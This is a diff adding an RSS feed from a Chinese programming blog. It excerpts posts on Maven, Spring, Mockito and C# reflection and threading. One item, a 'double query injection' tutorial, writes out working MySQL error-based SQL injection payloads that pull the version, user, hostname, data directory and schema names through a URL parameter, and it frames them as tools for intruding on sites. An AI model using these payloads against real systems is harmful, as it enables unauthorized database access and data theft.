@@ -1,0 +1,969 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>翻译 on bystander&#39;s blog</title>
+    <link>https://leizhiyuan.github.io/tags/%E7%BF%BB%E8%AF%91/</link>
+    <description>Recent content in 翻译 on bystander&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Sat, 01 Mar 2014 10:57:33 +0000</lastBuildDate>
+    
+	<atom:link href="https://leizhiyuan.github.io/tags/%E7%BF%BB%E8%AF%91/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>[译]使用Mockito简单mock入门</title>
+      <link>https://leizhiyuan.github.io/2014/03/01/%E8%AF%91%E4%BD%BF%E7%94%A8mockito%E7%AE%80%E5%8D%95mock%E5%85%A5%E9%97%A8/</link>
+      <pubDate>Sat, 01 Mar 2014 10:57:33 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2014/03/01/%E8%AF%91%E4%BD%BF%E7%94%A8mockito%E7%AE%80%E5%8D%95mock%E5%85%A5%E9%97%A8/</guid>
+      <description>我们在写单元测试的时候，面临的一个挑战就是要测试的内容总是依赖于其他组件，要是我们还得先配置好其他组件，未免有点不如意，那么我们可以使用Mocks来代替那些依赖的组件
+本文问了展示这个过程，我会创建一个DAL，数据访问层，这是一个类，提供了一个通用的api来访问和修改数据仓库的数据，然后，我们要测试这个api，而不用配置连接某个本地的数据库，，或者一个远程的数据库，或者是一个文件系统，反正就是任何放数据的东西，DAL层的好处就是隔离开了数据访问和应用程序代码
+首先使用maven来创建一个工程 mvn archetype:generate -DgroupId=info.sanaulla -DartifactId=MockitoDemo -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false 执行之后，本地生成MockitoDemo 文件夹，然后整个工程的目录结构与生成好了。
+然后，我们写这样一个model类，表示book类型 package info.sanaulla.models;
+import java.util.List;
+/** * Model class for the book details. */ public class Book {
+private String isbn; private String title; private List&amp;lt;String&amp;gt; authors; private String publication; private Integer yearOfPublication; private Integer numberOfPages; private String image;
+public Book(String isbn, String title, List&amp;lt;String&amp;gt; authors, String publication, Integer yearOfPublication, Integer numberOfPages, String image){
+this.isbn = isbn; this.title: = title; this.</description>
+    </item>
+    
+    <item>
+      <title>Spring依赖注入</title>
+      <link>https://leizhiyuan.github.io/2013/09/20/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Fri, 20 Sep 2013 19:06:00 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/20/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/</guid>
+      <description>在Spring框架中，依赖注入设计模式主要用来定义对象之间的依赖，存在两种主要类型
+1)setter注入(设置器)
+2)constructor注入(构造器)
+1.Setter注入 是最流行最简单的DI方法，通过一个setter方法来完成依赖。
+例子：
+一个有一个setter方法的Helper类 package com.mkyong.output;
+import com.mkyong.output.IOutputGenerator;
+public class OutputHelper { IOutputGenerator outputGenerator;
+public void setOutputGenerator(IOutputGenerator outputGenerator){ this.outputGenerator = outputGenerator; } } 再写一个bean配合iwenjianshengming这些bean，并且通过property(属性)标签来设置依赖 &amp;lt;beans xmlns=&amp;ldquo;http://www.springframework.org/schema/beans&amp;quot; xmlns:xsi=&amp;ldquo;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xsi:schemaLocation=&amp;ldquo;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd&amp;quot;&amp;gt;
+&amp;amp;lt;bean id=&amp;#34;OutputHelper&amp;#34; class=&amp;#34;com.mkyong.output.OutputHelper&amp;#34;&amp;amp;gt; &amp;amp;lt;property name=&amp;#34;outputGenerator&amp;#34;&amp;amp;gt; &amp;amp;lt;ref bean=&amp;#34;CsvOutputGenerator&amp;#34; /&amp;amp;gt; &amp;amp;lt;/property&amp;amp;gt; &amp;amp;lt;/bean&amp;amp;gt; &amp;lt;bean id=&amp;ldquo;CsvOutputGenerator&amp;rdquo; class=&amp;ldquo;com.mkyong.output.impl.CsvOutputGenerator&amp;rdquo; /&amp;gt; &amp;lt;bean id=&amp;ldquo;JsonOutputGenerator&amp;rdquo; class=&amp;ldquo;com.mkyong.output.impl.JsonOutputGenerator&amp;rdquo; /&amp;gt;
+&amp;lt;/beans&amp;gt; 看到了把。我们只需要一个setter方法把CsvOutputGenerator注入进去就行了
+2.Constructor注入 这种方式是通过一个构造函数来完成依赖设置的
+例子：
+一个有着一个构造函数的Helper类 package com.mkyong.output;
+import com.mkyong.output.IOutputGenerator;
+public class OutputHelper { IOutputGenerator outputGenerator;
+OutputHelper(IOutputGenerator outputGenerator){ this.outputGenerator = outputGenerator; } } 然后当然是一个bean配置文件了。通过constructor-arg标签来写依赖 &amp;lt;beans xmlns=&amp;ldquo;http://www.</description>
+    </item>
+    
+    <item>
+      <title>Spring松耦合示例</title>
+      <link>https://leizhiyuan.github.io/2013/09/20/spring%E6%9D%BE%E8%80%A6%E5%90%88%E7%A4%BA%E4%BE%8B/</link>
+      <pubDate>Fri, 20 Sep 2013 15:50:46 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/20/spring%E6%9D%BE%E8%80%A6%E5%90%88%E7%A4%BA%E4%BE%8B/</guid>
+      <description>面向对象设计的理念是把整个系统分成一组可重用的组件，然而，当系统变得越大的时候，尤其是在java中，这最大的对象依赖将会紧紧耦合，以至于非常难以管理和修改，而现在，你可以使用Spring框架扮演一个中间模块的角色，方便高效地管理其他组件依赖
+输出生成的例子 看个例子，假设你的项目有一个方法可以输出内容到csv或者json格式，你可能写出这样的代码 package com.mkyong.output;
+public interface IOutputGenerator { public void generateOutput(); } ，然后是实现接口的类 package com.mkyong.output.impl;
+import com.mkyong.output.IOutputGenerator;
+public class CsvOutputGenerator implements IOutputGenerator { public void generateOutput(){ System.out.println(&amp;ldquo;Csv Output Generator&amp;rdquo;); } } 再写个Json生成的类 package com.mkyong.output.impl;
+import com.mkyong.output.IOutputGenerator;
+public class JsonOutputGenerator implements IOutputGenerator { public void generateOutput(){ System.out.println(&amp;ldquo;Json Output Generator&amp;rdquo;); } } 有好几种方法来调用IOutputGenerator接口，以及我们如何使用Spring来避免对象的过度耦合。
+方法1-直接调用 package com.mkyong.common;
+import com.mkyong.output.IOutputGenerator; import com.mkyong.output.impl.CsvOutputGenerator;
+public class App { public static void main( String[] args ) { IOutputGenerator output = new CsvOutputGenerator(); output.</description>
+    </item>
+    
+    <item>
+      <title>Spring3实例入门-Hello World</title>
+      <link>https://leizhiyuan.github.io/2013/09/20/spring3%E5%AE%9E%E4%BE%8B%E5%85%A5%E9%97%A8-hello-world/</link>
+      <pubDate>Fri, 20 Sep 2013 13:14:39 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/20/spring3%E5%AE%9E%E4%BE%8B%E5%85%A5%E9%97%A8-hello-world/</guid>
+      <description>每次看到hello world,都有一种说不出的赶脚，想起了一个程序员，退休后写毛笔字，取笔研磨铺纸，大笔一挥，写下了“hello world”。
+1.使用Maven生成项目结构 mvn archetype:generate -DgroupId=com.mkyong.core -DartifactId=Spring3Example -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false 2.转换成Eclipse项目 mvn eclipse:eclipse 3.添加Spring3.0 依赖 在pom.xml文件里添加Spring 3.0 依赖，然后依赖会从Maven中央仓库自动下载 &amp;lt;project xmlns=&amp;ldquo;http://maven.apache.org/POM/4.0.0&amp;quot; xmlns:xsi=&amp;ldquo;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xsi:schemaLocation=&amp;ldquo;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&amp;quot;&amp;gt; &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt; &amp;lt;groupId&amp;gt;com.mkyong.core&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;Spring3Example&amp;lt;/artifactId&amp;gt; &amp;lt;packaging&amp;gt;jar&amp;lt;/packaging&amp;gt; &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt; &amp;lt;name&amp;gt;Spring3Example&amp;lt;/name&amp;gt; &amp;lt;url&amp;gt;http://maven.apache.org&amp;lt;/url&amp;gt;
+&amp;amp;lt;properties&amp;amp;gt; &amp;amp;lt;spring.version&amp;amp;gt;3.0.5.RELEASE&amp;amp;lt;/spring.version&amp;amp;gt; &amp;amp;lt;/properties&amp;amp;gt; &amp;amp;lt;dependencies&amp;amp;gt; &amp;amp;lt;!-- Spring 3 dependencies --&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.springframework&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;spring-core&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${spring.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.springframework&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;spring-context&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;${spring.version}&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;/dependencies&amp;amp;gt; &amp;lt;/project&amp;gt;
+4.Spring bean 写个简单的bean package com.mkyong.core;
+/** * Spring bean * */ public class HelloWorld { private String name;</description>
+    </item>
+    
+    <item>
+      <title>使用Maven创建Web项目</title>
+      <link>https://leizhiyuan.github.io/2013/09/20/%E4%BD%BF%E7%94%A8maven%E5%88%9B%E5%BB%BAweb%E9%A1%B9%E7%9B%AE/</link>
+      <pubDate>Fri, 20 Sep 2013 08:44:11 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/20/%E4%BD%BF%E7%94%A8maven%E5%88%9B%E5%BB%BAweb%E9%A1%B9%E7%9B%AE/</guid>
+      <description>本文通过Maven完成一个简单的Web项目（注意，Spring配置不是重点，看看就行）
+1.从Maven模板创建Web应用程序 命令格式如下： mvn archetype:generate -DgroupId={project-packaging} -DartifactId={project-name} -DarchetypeArtifactId=maven-archetype-webapp -DinteractiveMode=false 这就告诉Maven从**maven-archetype-webapp **这个模板来创建
+友情提示：是不是太难记了..好吧，直接输入 mvn archetype:generate 根据向导来创建把。。
+比如我这样写： &amp;gt; mvn archetype:generate -DgroupId=com.mkyong -DartifactId=CounterWebApp -DarchetypeArtifactId=maven-archetype-webapp -DinteractiveMode=false [INFO] Scanning for projects&amp;hellip; [INFO]
+[INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; [INFO] Building Maven Stub Project (No POM) 1 [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; [INFO] [INFO] Generating project in Batch mode [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- [INFO] Using following parameters for creating project from Old (1.x) Archetype: maven-archetype-webapp:1.0 [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- [INFO] Parameter: groupId, Value: com.mkyong [INFO] Parameter: packageName, Value: com.</description>
+    </item>
+    
+    <item>
+      <title>Maven库依赖机制及添加自定义库</title>
+      <link>https://leizhiyuan.github.io/2013/09/19/maven%E5%BA%93%E4%BE%9D%E8%B5%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%93/</link>
+      <pubDate>Thu, 19 Sep 2013 22:49:42 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/19/maven%E5%BA%93%E4%BE%9D%E8%B5%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%93/</guid>
+      <description>一.Maven库依赖机制 Maven的库依赖机制可以帮助我们自动下载依赖的库文件，并且还能更新版本。。
+考虑一个情境来理解机制的工作原理，假设我们要使用Log4J库作为项目的日志记录。以下是我们要做的
+1.传统的方式 1）访问Log4J网站http://logging.apache.org/log4j/2.x/
+2）下载Log4J的jar包
+3）复制进项目的classpath里
+4）手工包含到项目的依赖里
+看到没，你要从头做到尾，如果Log4J更新了，你得再来一遍。。
+2.Maven的方式 1）需要知道Log4J的Maven坐标(coordinates,这个暂时没想到好名字)，就是这样的东西 &amp;lt;groupId&amp;gt;log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.2.14&amp;lt;/version&amp;gt; 然后Maven就会自动下载1.2.14版本的Log4J了。如果version这个元素没有，那么如果有了新版本，Maven会自动下载新版本的。
+2）在pom.xml里声明这个Maven坐标 &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.2.14&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; 3）当Maven编译或者build的时候，Log4J会自动下载，放入本地仓库里
+4）Maven全部接管
+3.解释 搜索顺序前面说过了。本地-》中央-》远程仓库
+Maven坐标咋来的，当然去中央仓库搜索之了，搜索结果清晰的令人发指
+二.添加自定义库到本地仓库 有两个情况，需要我们包含自定义的库到本地仓库里
+1是你想使用的jar文件不再中央仓库
+2是你创建了一个自定义的jar包，需要另一个项目使用这个jar
+比如，kaptche，一个第三方的java库，生成验证码，现在中央仓库没有了。
+我们想要加到本地仓库里
+1.mvn安装 下载kaptche，解压并且拷贝kaptcha-version.jar到其他任何你喜欢的地方，比如c盘，然后输入如下格式的命令 mvn install:install-file -Dfile=c:\kaptcha-{version}.jar -DgroupId=com.google.code -DartifactId=kaptcha -Dversion={version} -Dpackaging=jar 这里我这样输入 D:&amp;amp;gt;mvn install:install-file -Dfile=c:\kaptcha-2.3.jar -DgroupId=com.google.code -DartifactId=kaptcha -Dversion=2.3 -Dpackaging=jar [INFO] Scanning for projects&amp;hellip; [INFO] Searching repository for plugin with prefix: &amp;lsquo;install&amp;rsquo;. [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; [INFO] Building Maven Default Project [INFO] task-segment: install:install-file [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; [INFO] [install:install-file] [INFO] Installing c:\kaptcha-2.</description>
+    </item>
+    
+    <item>
+      <title>Maven仓库详解</title>
+      <link>https://leizhiyuan.github.io/2013/09/19/maven%E4%BB%93%E5%BA%93%E8%AF%A6%E8%A7%A3/</link>
+      <pubDate>Thu, 19 Sep 2013 22:05:10 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/19/maven%E4%BB%93%E5%BA%93%E8%AF%A6%E8%A7%A3/</guid>
+      <description>本文由我翻译合并了多篇文章，整理成一篇。
+一.本地仓库(Local Repository) 本地仓库就是一个本机的目录，这个目录被用来存储我们项目的所有依赖（插件的jar包还有一些其他的文件），简单的说，当你build一个Maven项目的时候，所有的依赖文件都会放在本地仓库里，仓库供所有项目都可以使用
+默认情况下，本地仓库在.m2目录，windows下的话就是你的用户名目录下的.m2目录
+1.更新本地仓库目录 找到你的MAVEN_HOME目录下的conf/setting.xml文件，更新localRepository节点 &amp;lt;settings&amp;gt; &amp;lt;!&amp;ndash; localRepository | The path to the local repository maven will use to store artifacts. | | Default: ~/.m2/repository &amp;lt;localRepository&amp;gt;/path/to/local/repo&amp;lt;/localRepository&amp;gt; &amp;ndash;&amp;gt;
+&amp;lt;localRepository&amp;gt;D:/maven/repo&amp;lt;/localRepository&amp;gt;
+2.保存一下 完成了。新的本地仓库被放在了D:/maven/repo
+看一下这个目录
+
+二.中央仓库(central repository) 当我们build一个Maven项目的时候，Maven会检查我们的pom.xml文件，来定义项目的依赖，然后Maven会在本地仓库里查找，如果没有找到，就去maven的中央库去下载，地址是
+http://search.maven.org/#browse
+看起来是这样的
+
+&amp;nbsp;
+注意啊，虽然这个是新的中央仓库，但有时候还是会从_“http://repo1.maven.org/maven/_这个旧仓库下载东西，不过不要紧，理解就行了
+三.远程仓库(Remote Respository) 在Maven中，当你在pom.xml中生命的依赖既不在本地库，也不在中央库的时候，就会报错。
+1.例子 org.jvnet.localizer这个包仅在java.net的仓库里有(以前是，现在中央仓库也有了。但理解就行) &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.jvnet.localizer&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;localizer&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.8&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; 当我们build的时候，会失败，并输出未找到错误信息
+2.声明java.net仓库 为了告诉Maven从远程仓库里获取依赖，我们需要声明一个远程仓库，在pom.xml里这样写 &amp;lt;repositories&amp;gt; &amp;lt;repository&amp;gt; &amp;lt;id&amp;gt;java.net&amp;lt;/id&amp;gt; &amp;lt;url&amp;gt;https://maven.java.net/content/repositories/public/&amp;lt;/url&amp;gt; &amp;lt;/repository&amp;gt; &amp;lt;/repositories&amp;gt; 这样，Maven搜索依赖的顺序就是：
+1）搜索本地仓库，没有找到，就去第2步，否则退出
+2）搜索中央仓库，没有找到，就去第3步，否则退出
+3）去java.net远程仓库获取，没有找到，就报错，否则退出
+补充：JBoss也有个远程仓库，可以如下配置： &amp;lt;project &amp;hellip;&amp;gt; &amp;lt;repositories&amp;gt; &amp;lt;repository&amp;gt; &amp;lt;id&amp;gt;JBoss repository&amp;lt;/id&amp;gt; &amp;lt;url&amp;gt;http://repository.</description>
+    </item>
+    
+    <item>
+      <title>Maven安装教程</title>
+      <link>https://leizhiyuan.github.io/2013/09/19/maven%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</link>
+      <pubDate>Thu, 19 Sep 2013 21:15:09 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/19/maven%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</guid>
+      <description>Maven不需要作为服务组件安装到windows上，仅仅需要下载，解压，然后配置一下环境变量就行了
+1.JDK和JAVA_HOME 确保JDK已经安装，同时JAVA_HOME变量已经添加到了windows环境变量里，指向jdk目录
+
+&amp;nbsp;
+2.下载Maven 去Maven主页,选个版本，点击下载
+3.解压 解压下载的zip文件，重命名，比如我放到D盘的Maven目录
+4.添加MAVEN_HOME环境变量 添加一个新的环境变量MAVEN_HOME到环境变量，指向Maven目录
+
+&amp;nbsp;
+5.添加path变量 更新Path变量，把Maven的bin目录添加进去，这样就可以在任何地方执行mvn命令了
+
+&amp;nbsp;
+6.验证 打开命令行，输入 mvn -version 如果看到类似下面的 C:\Documents and Settings\mkyong&amp;gt;mvn -version Apache Maven 2.2.1 (r801777; 2009-08-07 03:16:01+0800) Java version: 1.6.0_13 Java home: C:\Program Files\Java\jdk1.6.0_13\jre Default locale: en_US, platform encoding: Cp1252 OS name: &amp;ldquo;windows xp&amp;rdquo; version: &amp;ldquo;5.1&amp;rdquo; arch: &amp;ldquo;x86&amp;rdquo; Family: &amp;ldquo;windows&amp;rdquo; Maven已经成功的安装配置了。
+老外写的太详细了。。。
+&amp;nbsp;</description>
+    </item>
+    
+    <item>
+      <title>Maven实例入门-随机数生成</title>
+      <link>https://leizhiyuan.github.io/2013/09/19/maven%E5%AE%9E%E4%BE%8B%E5%85%A5%E9%97%A8-%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90/</link>
+      <pubDate>Thu, 19 Sep 2013 20:50:23 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/09/19/maven%E5%AE%9E%E4%BE%8B%E5%85%A5%E9%97%A8-%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90/</guid>
+      <description>看了很多个例子，发现这个最好，译文中会带有我的一些了理解，有问题欢迎指出。
+0.Maven是什么？ Apache Maven，是一个软件（特别是Java软件）项目管理及自动构建工具，由Apache软件基金会所提供。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。
+可以看到，核心就是项目管理和自动构建了，从例子中将会体会更深。本例创建一个随机数生成程序。
+1.从Maven模板创建项目 Maven的环境变量配置和java类似，直接添加系统变量MAVEN_HOME指向你下载的maven目录，然后将bin目录添加到path环境变量里。
+在命令行下，进入到你想存储项目的位置，比如，我自己有个叫work的目录，那么我就cd到work目录，然后按下面的格式输入命令 mvn archetype:generate -DgroupId={project-packaging} -DartifactId={project-name} -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false 这是告诉Maven从**maven-archetype-quickstart **创建一个java项目，如果你这个参数不填，那么会列出一个列表，让你选择你想创建什么类型，比如web项目啊，啥的。
+友情提示：是不是太难记了..好吧，直接输入 mvn archetype:generate 根据向导来创建把。。
+比如 &amp;gt;mvn archetype:generate -DgroupId=com.mkyong -DartifactId=NumberGenerator -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false [INFO] Scanning for projects&amp;hellip; [INFO]
+[INFO] &amp;ndash; omitted for readability [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- [INFO] Using following parameters for creating project from Old (1.x) Archetype: maven-archetype-quickstart:1.0 [INFO] &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- [INFO] Parameter: groupId, Value: com.mkyong [INFO] Parameter: packageName, Value: com.mkyong [INFO] Parameter: package, Value: com.mkyong [INFO] Parameter: artifactId, Value: NumberGenerator [INFO] Parameter: basedir, Value: /Users/mkyong/Documents/workspace [INFO] Parameter: version, Value: 1.</description>
+    </item>
+    
+    <item>
+      <title>[译]反射(Reflection)和动态(dynamic)</title>
+      <link>https://leizhiyuan.github.io/2013/05/27/%E8%AF%91%E5%8F%8D%E5%B0%84reflection%E5%92%8C%E5%8A%A8%E6%80%81dynamic/</link>
+      <pubDate>Mon, 27 May 2013 08:47:34 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/05/27/%E8%AF%91%E5%8F%8D%E5%B0%84reflection%E5%92%8C%E5%8A%A8%E6%80%81dynamic/</guid>
+      <description>反射 &amp;nbsp; 当我们需要检查，调用一个程序集的内容的时候，用反射，比如，当VS给智能提示的时候，就应用了反射。  
+简单用法实例： &amp;nbsp;  var myAssembly = Assembly.LoadFile(@&amp;ldquo;C:\ClassLibrary1.dll&amp;rdquo;); var myType = myAssembly.GetType(&amp;ldquo;ClassLibrary1.Class1&amp;rdquo;); dynamic objMyClass = Activator.CreateInstance(myType); // 获取类的类型信息 Type parameterType = objMyClass.GetType();
+// 浏览方法 foreach (MemberInfo objMemberInfo in parameterType.GetMembers()) {Console.WriteLine(objMemberInfo.Name);}
+// 浏览属性. foreach (PropertyInfo objPropertyInfo in parameterType.GetProperties()) {Console.WriteLine(objPropertyInfo.Name);}
+//开始调用 parameterType.InvokeMember(&amp;ldquo;Display&amp;rdquo;,BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.InvokeMethod | BindingFlags.Instance,null, objMyClass, null);   
+实际一点的用处呢： &amp;nbsp; 1.当你也要开发一个类似VS的编辑器的时候，要提供智能提示就需要反射 2.当创建单元测试框架的时候，为了测试需要动态调用方法和属性的时候 3.有时候我们想把类型的属性，方法等全部导出的时候  
+动态dynamic &amp;nbsp; 编程语言分为强/弱类型，dynamic是弱类型，此关键字会让编译器不做编译时的类型检查，只做运行时的检查。  
+简单用法示例： &amp;nbsp;  dynamic x = &amp;ldquo;c#&amp;rdquo;; x++;  所以上面这行代码可以编译通过，但会产生运行时一场。</description>
+    </item>
+    
+    <item>
+      <title>双查询注入</title>
+      <link>https://leizhiyuan.github.io/2013/02/22/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Fri, 22 Feb 2013 20:57:02 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/02/22/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</guid>
+      <description>作者：bystander 论坛：法客论坛 这个东西比较难解释。我就不多解释。尽量通过这篇文章大家能够照猫画虎手注即可。想要深入理解的可以去看看mysql数据库的一些知识
+介绍一下双查询注入，有时候我们通过order by 语句获取到了确定的列数，可是当我们使用union select或union select all查询的时候，
+f4ck.net/index.php?id=-1 union select 1,2,3,4,5,6-- 却会出现一个错误提示，列数不一致。
+Different Number of Columns 而我们使用下面的语句：
+f4ck.net/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(concat(version(),user(),@@hostname,0x7e,@@datadir) as char),0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 执行之后就会显示mysql版本，用户名，服务器名, 以及数据目录…
+获取数据库里
+许多人会在上面的语句里使用:database()方法来获取数据库，
+f4ck.net/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 可是。这个方法只能获取一个数据库。如果你入侵的网站存在多个数据库。上面这个查询就不能用了因此使用下面这个方法更好些。。
+f4ck.net/index.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.</description>
+    </item>
+    
+    <item>
+      <title>C#多线程揭秘</title>
+      <link>https://leizhiyuan.github.io/2013/02/12/c#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8F%AD%E7%A7%98/</link>
+      <pubDate>Tue, 12 Feb 2013 16:31:22 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2013/02/12/c#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%8F%AD%E7%A7%98/</guid>
+      <description>文章略长。。。 Demo下载：Demo.Threading.zip 介绍 本文将通过一些例子来展示.net 中如何实现多线程，涉及到以下四部分。 1 .线程概念 2 .如何实现多线程 3 .如何确保线程安全 4 .死锁
+什么是进程 一个进程就是一个可执行文件运行的操作系统上下文环境。它被用来分隔虚拟地址空间，线程，对象句柄（指向类似文件这样的资源的指针），以及环境变量，进程还有一些类似优先级类和最大内存分配的属性。
+也就是说： 1 .一个进程就是一个包含资源的内存块。 2 .操作系统执行的一个单独的任务。 3 .一个正在运行的软件 4 .一个进程拥有一个/多个操作系统线程
+一般的。一个进程最大可以是4GB的内存空间，这块内存是安全，私有，其他进程是无法访问的。
